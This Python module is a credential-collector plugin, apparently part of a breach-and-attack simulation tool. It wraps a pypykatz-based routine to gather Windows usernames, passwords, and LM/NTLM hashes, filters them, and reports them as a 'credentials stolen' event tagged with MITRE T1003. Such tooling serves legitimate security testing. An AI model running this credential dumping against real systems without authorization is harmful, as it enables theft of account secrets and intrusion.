import logging
from pprint import pformat
from typing import Any, Collection, Mapping, Sequence

from monkeyevents import CredentialsStolenEvent
from monkeyevents.tags import DATA_FROM_LOCAL_SYSTEM_T1005_TAG, OS_CREDENTIAL_DUMPING_T1003_TAG
from monkeytypes import AgentID, Credentials, Event, LMHash, NTHash, Password, Username

from common.event_queue import IAgentEventPublisher

from .mimikatz_options import MimikatzOptions
from .pypykatz_handler import get_windows_creds
from .windows_credentials import WindowsCredentials

logger = logging.getLogger(__name__)


MIMIKATZ_CREDENTIAL_COLLECTOR_TAG = "mimikatz-credentials-collector"

MIMIKATZ_EVENT_TAGS = frozenset(
    (
        MIMIKATZ_CREDENTIAL_COLLECTOR_TAG,
        OS_CREDENTIAL_DUMPING_T1003_TAG,
        DATA_FROM_LOCAL_SYSTEM_T1005_TAG,
    )
)


class Plugin:
    def __init__(
        self,
        *,
        plugin_name: str,
        agent_id: AgentID,
        agent_event_publisher: IAgentEventPublisher,
        **kwargs,
    ):
        self._agent_event_publisher = agent_event_publisher
        self._agent_id = agent_id

    def run(
        self, *, options: Mapping[str, Any], interrupt: Event, **kwargs
    ) -> Sequence[Credentials]:
        logger.info("Attempting to collect windows credentials with pypykatz.")

        try:
            logger.debug(f"Parsing options: {pformat(options)}")
            mimikatz_options = MimikatzOptions(**options)
        except Exception as err:
            logger.exception(f"Failed to parse mimikatz options: {err}")
            return []

        windows_credentials = get_windows_creds()
        unique_credentials = list(set(windows_credentials))
        logger.info(f"Pypykatz gathered {len(unique_credentials)} unique credentials.")

        collected_credentials = self._to_credentials(unique_credentials)
        collected_credentials = self._remove_excluded_usernames(
            collected_credentials, mimikatz_options.excluded_username_prefixes
        )
        self._publish_credentials_stolen_event(collected_credentials)

        return collected_credentials

    @staticmethod
    def _to_credentials(windows_credentials: Sequence[WindowsCredentials]) -> Sequence[Credentials]:
        credentials = []
        for wc in windows_credentials:
            identity = None

            if wc.username:
                identity = Username(username=wc.username)

            if wc.password:
                password = Password(password=wc.password)
                credentials.append(Credentials(identity=identity, secret=password))

            if wc.lm_hash:
                lm_hash = LMHash(lm_hash=wc.lm_hash)
                credentials.append(Credentials(identity=identity, secret=lm_hash))

            if wc.ntlm_hash:
                ntlm_hash = NTHash(nt_hash=wc.ntlm_hash)
                credentials.append(Credentials(identity=identity, secret=ntlm_hash))

            if len(credentials) == 0 and identity is not None:
                credentials.append(Credentials(identity=identity, secret=None))

        return credentials

    @staticmethod
    def _remove_excluded_usernames(
        credentials: Collection[Credentials], excluded_username_prefixes: Collection[str]
    ) -> Sequence[Credentials]:
        filtered_credentials = []
        for credential in credentials:
            if not isinstance(credential.identity, Username):
                filtered_credentials.append(credential)
                continue

            excluded = False
            for prefix in excluded_username_prefixes:
                if credential.identity.username.startswith(prefix):
                    logger.debug(f'Excluding credentials for username with prefix "{prefix}"')
                    excluded = True
                    break

            if not excluded:
                filtered_credentials.append(credential)

        return filtered_credentials

    def _publish_credentials_stolen_event(self, collected_credentials: Sequence[Credentials]):
        credentials_stolen_event = CredentialsStolenEvent(
            source=self._agent_id,
            tags=MIMIKATZ_EVENT_TAGS,
            stolen_credentials=collected_credentials,
        )

        self._agent_event_publisher.publish(credentials_stolen_event)
